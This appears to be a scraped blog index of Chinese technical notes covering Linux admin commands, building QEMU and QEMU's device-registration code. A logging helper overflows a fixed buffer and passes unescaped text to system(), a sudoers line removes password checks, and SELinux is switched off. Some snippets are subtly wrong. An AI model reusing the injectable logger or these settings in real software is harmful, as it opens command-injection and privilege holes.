/sys/bus/usb/drivers/ub/unbind centos安装内核header1yum install kernel-devel-$(uname -r) kernel-headers-$(uname -r) 如果遇到没有搜索结果, 可以做如下操作: 查看当前版本12[root@centos~]# cat /etc/redhat-releaseCentOS Linux release 7.4.1708 (Core) 修改文件/etc/yum.repos.d/CentOS-Vault.repo, 添加当前版本的以下信息:12345678910111213141516171819202122232425262728[C(Your Version Number)-base] 比如 [C5.6-base]name=CentOS-(Your Version Number) - Basebaseurl=http://vault.centos.org/(Your Version Number)/os/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5enabled=1[C(Your Version Number-updates]name=CentOS-(Your Version Number) - Updatesbaseurl=http://vault.centos.org/(Your Version Number)/updates/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5enabled=1示例:[C7.4.1708-base]name=CentOS-7.4.1708 - Basebaseurl=https://vault.centos.org/7.4.1708/os/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7enabled=1[C7.4.1708-updates]name=CentOS-7.4.1708 - Updatesbaseurl=https://vault.centos.org/7.4.1708/updates/$basearch/gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7enabled=1 之后再试一次install即可. 更多参考Finding Old kernel-devel Packages For CentOS 添加sudoer 并且取消密码12superuser ALL=(ALL) NOPASSWD:ALLsuperuser ALL=(ALL:ALL) ALL #不取消密码 创建ssh服务12345$ yum -y install openssh-server openssh-clients$ chkconfig sshd on$ service sshd start$ netstat -tulpn | grep :22$ vi /etc/sysconfig/iptables -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT 创建ftp 服务123sudo yum install vsftpdsudo service vsftpd restartchkconfig vsftpd on ubuntu修改内核调试启动项1vi /etc/default/grub 在屁股后面添加 kgdboc&#x3D;ttyS1,115200 12grep menu /boot/grub/grub.cfggrub-reboot ‘1&gt;3’ 第一个数字1代表第二行的submenu，第二个3代表submenu的第四个（从0开始） 挂起一个进程ctrl+zfg 恢复 打包、解压文件解包使用x,打包使用c tar.xz解包:tar zxvf file.tar.xz 或者:xz -d file.tar.xz &amp;&amp; tar xvf file.tar打包:tar zcvf file.tar.xz .tar解包：tar xvf FileName.tar打包：tar cvf FileName.tar DirName（注：tar是打包，不是压缩！）———————————————.gz解压1：gunzip FileName.gz解压2：gzip -d FileName.gz压缩：gzip FileName .tar.gz 和 .tgz解压：tar zxvf FileName.tar.gz压缩：tar zcvf FileName.tar.gz DirName———————————————.bz2解压1：bzip2 -d FileName.bz2解压2：bunzip2 FileName.bz2压缩： bzip2 -z FileName .tar.bz2解压：tar jxvf FileName.tar.bz2压缩：tar jcvf FileName.tar.bz2 DirName———————————————.bz解压1：bzip2 -d FileName.bz解压2：bunzip2 FileName.bz压缩：未知 .tar.bz解压：tar jxvf FileName.tar.bz压缩：未知———————————————.Z解压：uncompress FileName.Z压缩：compress FileName.tar.Z 解压：tar Zxvf FileName.tar.Z压缩：tar Zcvf FileName.tar.Z DirName———————————————.zip解压：unzip FileName.zip压缩：zip FileName.zip DirName———————————————.rar解压：rar x FileName.rar压缩：rar a FileName.rar DirName———————————————.lha解压：lha -e FileName.lha压缩：lha -a FileName.lha FileName———————————————.rpm解包：rpm2cpio FileName.rpm | cpio -div———————————————.deb解包：ar p FileName.deb data.tar.gz | tar zxf -———————————————.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea解压：sEx x FileName.*压缩：sEx a FileName.* FileName 单独重新编译一个内核模块当我们想修改内核某个模块,又不想重新make all的时候,可以这样操作. 1make drivers/net/ethernet/intel/e1000/e1000.ko 或者 1make drivers/net/ethernet/intel/e1000/ gcc 汇编12345.intel_syntax noprefix # intel 汇编格式xor eax, eax.att_syntax prefix # att汇编格式movl %adx, %eax… 一个简单的 foo.s 文件: 1234567.intel_syntax noprefix #声明 intel 格式.text # 声明 .text 字段.global test # 声明函数test:mov rax,12ret.global test.eh # 结束函数声明 t.c: 12345#include &lt;stdio.h&gt;int test(void);void main(void)&#123; printf(&quot;%d\\n&quot;, test());&#125; 编译链接: 12gcc -c t.sgcc t.c t.o -o tt2 更多参考GNU assembler, How do I compile the asm generated by GCC? gcc 内联汇编语法示例123456789 __asm__ (&quot;movl %eax, %ebx\\n\\t&quot; &quot;movl $0x56, %esi\\n\\t&quot; &quot;movl %ecx, $label(%edx,%ebx,$4)\\n\\t&quot; &quot;movb %ah, (%ebx)&quot;);asm ( assembler template : output operands /* optional */ : input operands /* optional */ : list of clobbered registers /* optional */ ); 1234567int a=10, b;asm (&quot;movl %1, %%eax; movl %%eax, %0;&quot; :&quot;=r&quot;(b) /* output */ :&quot;r&quot;(a) /* input */ :&quot;%eax&quot; /* clobbered register */ ); “&#x3D;r”(b) 的含义, 将输出放入倒变量b里(%0 代表第一个变量, 此处第一个变量是输出里的b, 所以%0就是b, %1是 a). r代表使用任意寄存器, 如果是其它寄存器, 参考如下: 12345678910+---+--------------------+| r | Register(s) |+---+--------------------+| a | %eax, %ax, %al || b | %ebx, %bx, %bl || c | %ecx, %cx, %cl || d | %edx, %dx, %dl || S | %esi, %si || D | %edi, %di |+---+--------------------+ 如果是使用内存, 用 m. 其它指示标识: “m” : A memory operand is allowed, with any kind of address that the machine supports in general. “o” : A memory operand is allowed, but only if the address is offsettable. ie, adding a small offset to the address gives a valid address. “V” : A memory operand that is not offsettable. In other words, anything that would fit the m’ constraint but not the o’constraint. “i” : An immediate integer operand (one with constant value) is allowed. This includes symbolic constants whose values will be known only at assembly time. “n” : An immediate integer operand with a known numeric value is allowed. Many systems cannot support assembly-time constants for operands less than a word wide. Constraints for these operands should use ’n’ rather than ’i’. “g” : Any register, memory or immediate integer operand is allowed, except for registers that are not general registers. x86指令独有: 1234567891011121. &quot;r&quot; : Register operand constraint, look table given above.2. &quot;q&quot; : Registers a, b, c or d.3. &quot;I&quot; : Constant in range 0 to 31 (for 32-bit shifts).4. &quot;J&quot; : Constant in range 0 to 63 (for 64-bit shifts).5. &quot;K&quot; : 0xff.6. &quot;L&quot; : 0xffff.7. &quot;M&quot; : 0, 1, 2, or 3 (shifts for lea instruction).8. &quot;N&quot; : Constant in range 0 to 255 (for out instruction).9. &quot;f&quot; : Floating point register10. &quot;t&quot; : First (top of stack) floating point register11. &quot;u&quot; : Second floating point register12. &quot;A&quot; : Specifies the `a’ or `d’ registers. This is primarily useful for 64-bit integer values intended to be returned with the `d’ register holding the most significant bits and the `a’ register holding the least significant bits. 特殊符合含义: “&#x3D;“ : 将结果写入到指定位置 “&amp;“ : Means that this operand is an earlyclobber operand, which is modified before the instruction is finished using the input operands. Therefore, this operand may not lie in a register that is used as an input operand or as part of any memory address. An input operand can be tied to an earlyclobber operand if its only use as an input occurs before the early result is written. 示例: 123456789101112static inline char * strcpy(char * dest,const char *src)&#123;int d0, d1, d2;__asm__ __volatile__( &quot;1:\\tlodsb\\n\\t&quot; &quot;stosb\\n\\t&quot; &quot;testb %%al,%%al\\n\\t&quot; &quot;jne 1b&quot; : &quot;=&amp;S&quot; (d0), &quot;=&amp;D&quot; (d1), &quot;=&amp;a&quot; (d2) : &quot;0&quot; (src),&quot;1&quot; (dest) : &quot;memory&quot;);return dest;&#125; 当我们不希望编译器优化掉我们的某些特殊循环判断时: 1234asm (&quot;l1:\\tmovb (%0), %%al\\n\\t&quot; &quot;cmp $0xcc, %%al\\n\\t&quot; &quot;je l1&quot; ::&quot;r&quot;(&amp;buffer[0x7f])); 禁用gcc的某个函数优化123456#pragma GCC push_options#pragma GCC optimize(&quot;O0&quot;)void test(int a); return a;&#125;#pragma GCC pop_options 更多参考GCC-Inline-Assembly-HOWTO log至文件中有时候看不到printf, 需要log到文件里, 就经常需要查阅怎么写, 比较烦人. 记录一下. 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int sl(char* str)&#123; int len = 0; while(*str++)&#123; len++; &#125; return len;&#125;void log2file(char *fmt, ...)&#123; va_list args; va_start(args, fmt); char str[0x200]; // 请自己确保log的内容不超过0x200. vsprintf(str, fmt, args); va_end(args); int fd; fd = open(&quot;/tmp/mylog.log&quot;, O_CREAT|O_WRONLY|O_APPEND, 0777); if(fd == -1)&#123; printf(&quot;create fail\\n&quot;); fd = open(&quot;/tmp/mylog.log&quot;, O_WRONLY|O_APPEND, 0777); if(fd==-1) &#123; char str2[0x200]; sprintf(str2, &quot;echo \\&quot;%s\\&quot;&gt; /tmp/mylog.log&quot;, str); system(str2); return; &#125; &#125; printf(&quot;write\\n&quot;); write(fd, str, sl(str)); close(fd);&#125;void main()&#123; log2file(&quot;hello:%x\\n&quot;, 0x111231);&#125; centos7 代理yum123yum install epel-release -yrpm -ivh https://mirrors.aliyun.com/epel/epel-release-latest-7.noarch.rpmyum install -y proxychains-ng 修改配置vi /etc/proxychains.conf: 12345[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;socks5 192.168.150.1 7890 代理yum 1$&gt; proxychains4 yum install bpftrace","categories":[],"tags":[],"keywords":[]},{"title":"qemu编译简单指南一个 :)","slug":"qemu-build","date":"2022-06-17T11:38:05.952Z","updated":"2022-03-18T09:47:16.884Z","comments":true,"path":"2022/06/17/qemu-build/","link":"","permalink":"http://474172261.github.io/2022/06/17/qemu-build/","excerpt":"简单的qemu编译说明, 其它有关的网络和管理配置等 :)","text":"简单的qemu编译说明, 其它有关的网络和管理配置等 :) qemu编译 登录官方网站直接下载源码包（例如文件名为qemu-2.8.0.tar.bz2） 解压文件tar –jxvf qemu-2.8.0.tar.bz2 安装 依赖库 Ubuntu系统 12345678sudo apt-get install -y zlib1g-dev sudo apt-get install -y libglib2.0-dev sudo apt-get install -y autoconf2.13 sudo apt-get install -y libtool sudo apt-get install -y libgtk2.0-dev 以下组件可选, 针对更新的版本, 比如5.x, 6.xsudo apt-get install ninja-buildsudo apt-get install libpixman-1-dev Centos系统 123456789yum install zlib-devel.x86_64 -y yum install gtk2-devel –y yum install autoconf yum install gettext yum install flex yum install bison以下安装包可选yum install ninja-buildyum install spice-server-devel 编译安装 1234cd qemu-2.8.0 ./configure --enable-kvm --enable-debug --target-list=x86_64-softmmumake -j 4 #注意, 此处的4与虚拟机或者物理机的逻辑处理器个数一样. 可以比物理的数量更小,不要超过.sudo make install kvmUbuntu系统 sudo apt install qemu-kvm其它Linux系统 yum install qemu-kvm.x86_64注意查看cat /proc/cpuinfo |grep -E &quot;vmx|svm&quot; 是否有结果, 如果没有, 记得启动vmware的cpu的虚拟化intel VT-x选项. 创建虚拟机假设创建一个虚拟机硬盘为10G:qemu-img create -f qcow2 centos.img 10G 通过iso创建安装系统qemu-system-x86_64 -m 256 -hda centos.img -cdrom winxpsp2.iso -enable-kvm 如果默认没有虚拟机界面, 可以安装vncviewer查看 1sudo apt-get install tigervnc-viewer 安装完成后, 启动qemu会提示连接 127.0.0.1:5900, 我们使用vncviewer ::5900 连接即可 使libvirt启动我们编译的qemu版本如果使用libvirt创建过虚拟机, 那么可以在 /etc/libvirt/qemu/找到虚拟机对应的xml文件. 修改下列参数: 1&lt;emulator&gt;/usr/bin/qemu-system-x86_64&lt;/emulator&gt; 改成自己编译的qemu文件目录. 比如/home/vv/qemu-6.2.0/build/qemu-system-x86_64 对于ubuntu, 还需要修改沙箱配置, 给libvirt配置访问权限. 先使用sudo aa-status查看是否包含/usr/sbin/libvirtd, 如果包含, 说明启用了apparmor. 修改以下文件/etc/apparmor.d/usr.sbin.libvirtd, 在下列类似列后面添加以下内容: 12/usr/bin/kvm rmix, 这行默认就有/home/vv/qemu-6.2.0/** rmix, 将我们的qemu目录添加到沙箱 还有/etc/apparmor.d/abstractions/libvirt-qemu: 12/usr/bin/kvm rmix, 这行默认就有/home/vv/qemu-6.2.0/** rmix, 将我们的qemu目录添加到沙箱 之后重新加载规则sudo systemctl reload apparmor 这样libvirt应该就可以正常启用它了. 如果没有启用apparmor还存在权限问题, 就把selinux暂时关闭: setenforce 0 更多apparmor的语法规则, 参考 Apparmor 配置文件组件和语法 如果希望virt-manager能启用我们的qemu, 还需要为qemu添加两个编译组件: 12yum install qemu-device-usb-redirect.x86_64 usbredir.x86_64 usbredir-devel.x86_64 yum install spice-server-devel spice-protocol spice-server 如果是ubuntu, 请使用sudo apt install libspice-server-dev libusbredirparser-dev . 并确保./configure --enable-kvm --enable-debug --target-list=x86_64-softmmu --enable-spice 输出以下内容: 123spice support: YESlibusb: YESusb net redir: YES 之后重新编译qemu. 然后在virt-manager的 Edit-&gt;Preferences-&gt;General勾选 Enable XML editing. 之后按照如下修改: 下一次启动虚拟机就可以生效了(使用virt-manager也需要设置沙箱权限). 参考: Changing libvirt emulator: Permission denied 其它使用和研究参考资料qemu及kvm软件安全研究简介 qemu命令行网络相关参数详解 给qemu配置tap 配置tap前记得先安装 bridge-utils, uml-utilities virtualhole——qemu安全入门练习题 这个练习题既可以加深你对虚拟化漏洞的理解, 也可以提高你的利用技巧, 虚拟化入门必选 Scavenger: Misuse Error Handling Leading to Qemu&#x2F;KVM Escape CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路 Slirp QEMU escape Virtio and Vhost Architecture part1 Virtio and Vhost Architecture part2 错误处理ERROR: glib-2.56 gthread-2.0 is required to compile QEMU 这个应该是没有装好glib相关的东西, 执行sudo apt install libglib2.0-dev安装, 如果出现如下错误: 12345The following packages have unmet dependencies:libglib2.0-dev : Depends: libglib2.0-0 (= 2.64.6-1~ubuntu20.04.3) but 2.64.6-1~ubuntu20.04.4 is to be installed Depends: libglib2.0-bin (= 2.64.6-1~ubuntu20.04.3) Depends: zlib1g-dev but it is not going to be installedE: Unable to correct problems, you have held broken packages. 先安装libglib2.0-0, sudo apt install libglib2.0-0=2.64.6-1~ubuntu20.04.3 警告!!! 更改libglib2.0-0的版本可能导致ubuntu 20.04的桌面启动出问题, 重启后将进不了桌面. Depends: zlib1g (&#x3D; 1:1.2.11.dfsg-2ubuntu1) but 1:1.2.11.dfsg-2ubuntu1.2 is to be installed 如果安装zlib1g-dev失败出现如下错误: 12345678910111213$ sudo apt install zlib1g-devReading package lists... DoneBuilding dependency tree Reading state information... DoneSome packages could not be installed. This may mean that you haverequested an impossible situation or if you are using the unstabledistribution that some required packages have not yet been createdor been moved out of Incoming.The following information may help to resolve the situation:The following packages have unmet dependencies:zlib1g-dev : Depends: zlib1g (= 1:1.2.11.dfsg-2ubuntu1) but 1:1.2.11.dfsg-2ubuntu1.2 is to be installedE: Unable to correct problems, you have held broken packages. 又提示依赖的版本不对, 用如下方法安装 1sudo apt install zlib1g=1:1.2.11.dfsg-2ubuntu1 再重新安装sudo apt install zlib1g-dev libglib2.0-dev","categories":[],"tags":[],"keywords":[]},{"title":"QEMU虚拟化设备简介","slug":"qemu-virtual-device-init","date":"2022-06-17T11:38:05.952Z","updated":"2022-03-29T09:21:16.766Z","comments":true,"path":"2022/06/17/qemu-virtual-device-init/","link":"","permalink":"http://474172261.github.io/2022/06/17/qemu-virtual-device-init/","excerpt":"简单介绍qemu的虚拟化组件的初始化和入口","text":"简单介绍qemu的虚拟化组件的初始化和入口 虚拟化设备分为两类, 一种是全虚拟化, 一种是半虚拟化. 一般来说, 全虚拟化设备是指设备相关的实现都在物理机的用户态, 半虚拟化是部分实现在物理机的内核态. 一个常见的半虚拟化标准是virtio设备标准. 但是不同平台的不同虚拟化软件, 对同一个虚拟化设备的实现存在差异, 所以也不一定是按前面的说法去实现的. 传统IO设备传统的IO设备是全虚拟化设备, 此类设备有IO port及IO memory, 可以通过写IO相关的端口或者内存实现设备交互. 虚拟设备的注册qemu的每个虚拟化设备都会调用 type_init() 确认设备的注册操作, 调用 type_register&#x2F;type_register_static 来注册一个虚拟设备, 传入的结构体如下: 1234567891011121314151617181920struct TypeInfo&#123; const char *name; const char *parent; size_t instance_size; size_t instance_align; void (*instance_init)(Object *obj); void (*instance_post_init)(Object *obj); void (*instance_finalize)(Object *obj); bool abstract; size_t class_size; void (*class_init)(ObjectClass *klass, void *data); void (*class_base_init)(ObjectClass *klass, void *data); void *class_data; InterfaceInfo *interfaces;&#125;; 以e1000为例的设备注册操作: 123456789101112131415161718192021222324static void e1000_register_types(void)&#123; int i; type_register_static(&amp;e1000_base_info); for (i = 0; i &lt; ARRAY_SIZE(e1000_devices); i++) &#123; const E1000Info *info = &amp;e1000_devices[i]; TypeInfo type_info = &#123;&#125;; type_info.name = info-&gt;name; type_info.parent = TYPE_E1000_BASE; type_info.class_data = (void *)info; type_info.class_init = e1000_class_init; type_register(&amp;type_info); &#125;&#125;TypeImpl *type_register_static(const TypeInfo *info)&#123; return type_register(info);&#125;type_init(e1000_register_types) .name 决定了设备名称, 在qemu中使用 -device 查看所有device的时候可以看到的名字. .class_init 指示了设备初始化的函数, 这里我关注e1000_class_init的初始化操作. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546static void e1000_class_init(ObjectClass *klass, void *data)&#123; DeviceClass *dc = DEVICE_CLASS(klass); PCIDeviceClass *k = PCI_DEVICE_CLASS(klass); E1000BaseClass *e = E1000_CLASS(klass); const E1000Info *info = data; k-&gt;realize = pci_e1000_realize; k-&gt;exit = pci_e1000_uninit; k-&gt;romfile = &quot;efi-e1000.rom&quot;; k-&gt;vendor_id = PCI_VENDOR_ID_INTEL; k-&gt;device_id = info-&gt;device_id; k-&gt;revision = info-&gt;revision; e-&gt;phy_id2 = info-&gt;phy_id2; k-&gt;class_id = PCI_CLASS_NETWORK_ETHERNET; set_bit(DEVICE_CATEGORY_NETWORK, dc-&gt;categories); dc-&gt;desc = &quot;Intel Gigabit Ethernet&quot;; dc-&gt;reset = qdev_e1000_reset; dc-&gt;vmsd = &amp;vmstate_e1000; device_class_set_props(dc, e1000_properties);&#125;struct PCIDeviceClass &#123; DeviceClass parent_class; void (*realize)(PCIDevice *dev, Error **errp); PCIUnregisterFunc *exit; PCIConfigReadFunc *config_read; PCIConfigWriteFunc *config_write; uint16_t vendor_id; uint16_t device_id; uint8_t revision; uint16_t class_id; uint16_t subsystem_vendor_id; /* only for header type = 0 */ uint16_t subsystem_id; /* only for header type = 0 */ /* * pci-to-pci bridge or normal device. * This doesn&#x27;t mean pci host switch. * When card bus bridge is supported, this would be enhanced. */ bool is_bridge; /* rom bar */ const char *romfile;&#125;; k-&gt;realize 就是主要的初始化函数. 在realize中, 一般就会初始化对应的IO空间和绑定处理函数. PCIDeviceClass-&gt;config_read和config_write 对应的是设备的PCI 配置空间的读写处理函数. 如果没有声明, 默认在do_pci_register_device中会赋值 pci_default_read_config&#x2F;pci_default_write_config. IO handler的初始化123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869static void pci_e1000_realize(PCIDevice *pci_dev, Error **errp)&#123; DeviceState *dev = DEVICE(pci_dev); E1000State *d = E1000(pci_dev); uint8_t *pci_conf; uint8_t *macaddr; pci_dev-&gt;config_write = e1000_write_config; pci_conf = pci_dev-&gt;config; /* TODO: RST# value should be 0, PCI spec 6.2.4 */ pci_conf[PCI_CACHE_LINE_SIZE] = 0x10; pci_conf[PCI_INTERRUPT_PIN] = 1; /* interrupt pin A */ e1000_mmio_setup(d); pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio); pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;io); ...&#125;static voide1000_mmio_setup(E1000State *d)&#123; int i; const uint32_t excluded_regs[] = &#123; E1000_MDIC, E1000_ICR, E1000_ICS, E1000_IMS, E1000_IMC, E1000_TCTL, E1000_TDT, PNPMMIO_SIZE &#125;; memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;e1000_mmio_ops, d, &quot;e1000-mmio&quot;, PNPMMIO_SIZE); memory_region_add_coalescing(&amp;d-&gt;mmio, 0, excluded_regs[0]); for (i = 0; excluded_regs[i] != PNPMMIO_SIZE; i++) memory_region_add_coalescing(&amp;d-&gt;mmio, excluded_regs[i] + 4, excluded_regs[i+1] - excluded_regs[i] - 4); memory_region_init_io(&amp;d-&gt;io, OBJECT(d), &amp;e1000_io_ops, d, &quot;e1000-io&quot;, IOPORT_SIZE);&#125;void memory_region_init_io(MemoryRegion *mr, Object *owner, const MemoryRegionOps *ops, void *opaque, const char *name, uint64_t size)&#123; memory_region_init(mr, owner, name, size); mr-&gt;ops = ops ? ops : &amp;unassigned_mem_ops; mr-&gt;opaque = opaque; mr-&gt;terminates = true;&#125;static const MemoryRegionOps e1000_mmio_ops = &#123; .read = e1000_mmio_read, .write = e1000_mmio_write, .endianness = DEVICE_LITTLE_ENDIAN, .impl = &#123; .min_access_size = 4, .max_access_size = 4, &#125;,&#125;;static const MemoryRegionOps e1000_io_ops = &#123; .read = e1000_io_read, .write = e1000_io_write, .endianness = DEVICE_LITTLE_ENDIAN,&#125;; 注意, 此处的pci_dev-&gt;config_write = e1000_write_config; 是PCIDevice结构体, realize函数由 pci_qdev_realize 调取, 如下: 12345678910111213141516171819202122232425262728293031static void pci_qdev_realize(DeviceState *qdev, Error **errp)&#123; PCIDevice *pci_dev = (PCIDevice *)qdev; PCIDeviceClass *pc = PCI_DEVICE_GET_CLASS(pci_dev); ... pci_dev = do_pci_register_device(pci_dev, object_get_typename(OBJECT(qdev)), pci_dev-&gt;devfn, errp); if (pci_dev == NULL) return; if (pc-&gt;realize) &#123; pc-&gt;realize(pci_dev, &amp;local_err); &#125; ...&#125;static PCIDevice *do_pci_register_device(PCIDevice *pci_dev, const char *name, int devfn, Error **errp)&#123; PCIDeviceClass *pc = PCI_DEVICE_GET_CLASS(pci_dev); PCIConfigReadFunc *config_read = pc-&gt;config_read; PCIConfigWriteFunc *config_write = pc-&gt;config_write;... if (!config_read) config_read = pci_default_read_config; if (!config_write) config_write = pci_default_write_config; pci_dev-&gt;config_read = config_read; pci_dev-&gt;config_write = config_write;&#125; 从顺序可以看到, realize函数在 do_pci_register_device 之后, do_pci_register_device 也会把 PCIDeviceClass-&gt;config_write 赋值给 PCIDevice-&gt;config_write. 所以最终的config_write是什么函数, 以realize为准. e1000刚好既有IO port 又有 IO memory. 从代码可以看出, 他们的初始化大同小异. 最开始会调用 memory_region_init 初始化MemoryRegion, 之后将对应的 MemoryRegion 绑定ops. 这里, port 绑定的 e1000_io_ops, memory 绑定的e1000_mmio_ops. memory_region_init_io 只是memory_region_init 的一个封装. 在初始化好 MemoryRegion 后, 会调用 pci_register_bar 注册它. 如下示例: 12pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;io); 第二个参数表面了注册到PCI 配置空间的哪个bar里(参考后续的pci配置空间). 第三个参数指示该 MemoryRegion的类型是port 还是memory. 至于具体的IO port或者memory的值是多少, 取决于Guest的操作系统怎么配置PCI配置空间的. 我们可以通过 lspci -v来查看相关配置: 特殊的IO port handler除了上述的常规注册MemoryRegionOps操作外, 还有一种注册IO handler的方法: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697void portio_list_init(PortioList *piolist, Object *owner, const MemoryRegionPortio *callbacks, void *opaque, const char *name)&#123; unsigned n = 0; while (callbacks[n].size) &#123; ++n; &#125; piolist-&gt;ports = callbacks; piolist-&gt;nr = 0; piolist-&gt;regions = g_new0(MemoryRegion *, n); piolist-&gt;address_space = NULL; piolist-&gt;opaque = opaque; piolist-&gt;owner = owner; piolist-&gt;name = name; piolist-&gt;flush_coalesced_mmio = false;&#125;static const MemoryRegionOps portio_ops = &#123; .read = portio_read, .write = portio_write, .endianness = DEVICE_LITTLE_ENDIAN, .valid.unaligned = true, .impl.unaligned = true,&#125;;static void portio_list_add_1(PortioList *piolist, const MemoryRegionPortio *pio_init, unsigned count, unsigned start, unsigned off_low, unsigned off_high)&#123; MemoryRegionPortioList *mrpio; unsigned i; /* Copy the sub-list and null-terminate it. */ mrpio = g_malloc0(sizeof(MemoryRegionPortioList) + sizeof(MemoryRegionPortio) * (count + 1)); mrpio-&gt;portio_opaque = piolist-&gt;opaque; memcpy(mrpio-&gt;ports, pio_init, sizeof(MemoryRegionPortio) * count); memset(mrpio-&gt;ports + count, 0, sizeof(MemoryRegionPortio)); /* Adjust the offsets to all be zero-based for the region. */ for (i = 0; i &lt; count; ++i) &#123; mrpio-&gt;ports[i].offset -= off_low; mrpio-&gt;ports[i].base = start + off_low; &#125; memory_region_init_io(&amp;mrpio-&gt;mr, piolist-&gt;owner, &amp;portio_ops, mrpio, piolist-&gt;name, off_high - off_low); // !!!!!!!!!!!!!!! if (piolist-&gt;flush_coalesced_mmio) &#123; memory_region_set_flush_coalesced(&amp;mrpio-&gt;mr); &#125; memory_region_add_subregion(piolist-&gt;address_space, start + off_low, &amp;mrpio-&gt;mr); piolist-&gt;regions[piolist-&gt;nr] = &amp;mrpio-&gt;mr; ++piolist-&gt;nr;&#125;void portio_list_add(PortioList *piolist, MemoryRegion *address_space, uint32_t start)&#123; const MemoryRegionPortio *pio, *pio_start = piolist-&gt;ports; unsigned int off_low, off_high, off_last, count; piolist-&gt;address_space = address_space; /* Handle the first entry specially. */ off_last = off_low = pio_start-&gt;offset; off_high = off_low + pio_start-&gt;len + pio_start-&gt;size - 1; count = 1; for (pio = pio_start + 1; pio-&gt;size != 0; pio++, count++) &#123; /* All entries must be sorted by offset. */ assert(pio-&gt;offset &gt;= off_last); off_last = pio-&gt;offset; /* If we see a hole, break the region. */ if (off_last &gt; off_high) &#123; portio_list_add_1(piolist, pio_start, count, start, off_low, off_high); /* ... and start collecting anew. */ pio_start = pio; off_low = off_last; off_high = off_low + pio-&gt;len + pio_start-&gt;size - 1; count = 0; &#125; else if (off_last + pio-&gt;len &gt; off_high) &#123; off_high = off_last + pio-&gt;len + pio_start-&gt;size - 1; &#125; &#125; /* There will always be an open sub-list. */ portio_list_add_1(piolist, pio_start, count, start, off_low, off_high);&#125; 这种特殊的io port的handler是在行51注册的 portio_ops 来处理的, 即portio_read 和portio_write. 之后, portio_write函数通过遍历注册的port, 来调用对应的处理函数: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657static const MemoryRegionPortio *find_portio(MemoryRegionPortioList *mrpio, uint64_t offset, unsigned size, bool write)&#123; const MemoryRegionPortio *mrp; for (mrp = mrpio-&gt;ports; mrp-&gt;size; ++mrp) &#123; if (offset &gt;= mrp-&gt;offset &amp;&amp; offset &lt; mrp-&gt;offset + mrp-&gt;len &amp;&amp; size == mrp-&gt;size &amp;&amp; (write ? (bool)mrp-&gt;write : (bool)mrp-&gt;read)) &#123; return mrp; &#125; &#125; return NULL;&#125;static uint64_t portio_read(void *opaque, hwaddr addr, unsigned size)&#123; MemoryRegionPortioList *mrpio = opaque; const MemoryRegionPortio *mrp = find_portio(mrpio, addr, size, false); uint64_t data; data = ((uint64_t)1 &lt;&lt; (size * 8)) - 1; if (mrp) &#123; data = mrp-&gt;read(mrpio-&gt;portio_opaque, mrp-&gt;base + addr); &#125; else if (size == 2) &#123; mrp = find_portio(mrpio, addr, 1, false); if (mrp) &#123; data = mrp-&gt;read(mrpio-&gt;portio_opaque, mrp-&gt;base + addr); if (addr + 1 &lt; mrp-&gt;offset + mrp-&gt;len) &#123; data |= mrp-&gt;read(mrpio-&gt;portio_opaque, mrp-&gt;base + addr + 1) &lt;&lt; 8; &#125; else &#123; data |= 0xff00; &#125; &#125; &#125; return data;&#125;static void portio_write(void *opaque, hwaddr addr, uint64_t data, unsigned size)&#123; MemoryRegionPortioList *mrpio = opaque; const MemoryRegionPortio *mrp = find_portio(mrpio, addr, size, true); if (mrp) &#123; mrp-&gt;write(mrpio-&gt;portio_opaque, mrp-&gt;base + addr, data); &#125; else if (size == 2) &#123; mrp = find_portio(mrpio, addr, 1, true); if (mrp) &#123; mrp-&gt;write(mrpio-&gt;portio_opaque, mrp-&gt;base + addr, data &amp; 0xff); if (addr + 1 &lt; mrp-&gt;offset + mrp-&gt;len) &#123; mrp-&gt;write(mrpio-&gt;portio_opaque, mrp-&gt;base + addr + 1, data &gt;&gt; 8); &#125; &#125; &#125;&#125; 举例 12345678910111213141516171819202122232425262728293031323334353637static const MemoryRegionPortio vbe_portio_list[] = &#123; &#123; 0, 1, 2, .read = vbe_ioport_read_index, .write = vbe_ioport_write_index &#125;,# ifdef TARGET_I386 &#123; 1, 1, 2, .read = vbe_ioport_read_data, .write = vbe_ioport_write_data &#125;,# endif &#123; 2, 1, 2, .read = vbe_ioport_read_data, .write = vbe_ioport_write_data &#125;, PORTIO_END_OF_LIST(),&#125;;void vga_init(VGACommonState *s, Object *obj, MemoryRegion *address_space, MemoryRegion *address_space_io, bool init_vga_ports)&#123; MemoryRegion *vga_io_memory; const MemoryRegionPortio *vga_ports, *vbe_ports; qemu_register_reset(vga_reset, s); s-&gt;bank_offset = 0; s-&gt;legacy_address_space = address_space; vga_io_memory = vga_init_io(s, obj, &amp;vga_ports, &amp;vbe_ports); memory_region_add_subregion_overlap(address_space, 0x000a0000, vga_io_memory, 1); memory_region_set_coalescing(vga_io_memory); if (init_vga_ports) &#123; portio_list_init(&amp;s-&gt;vga_port_list, obj, vga_ports, s, &quot;vga&quot;); 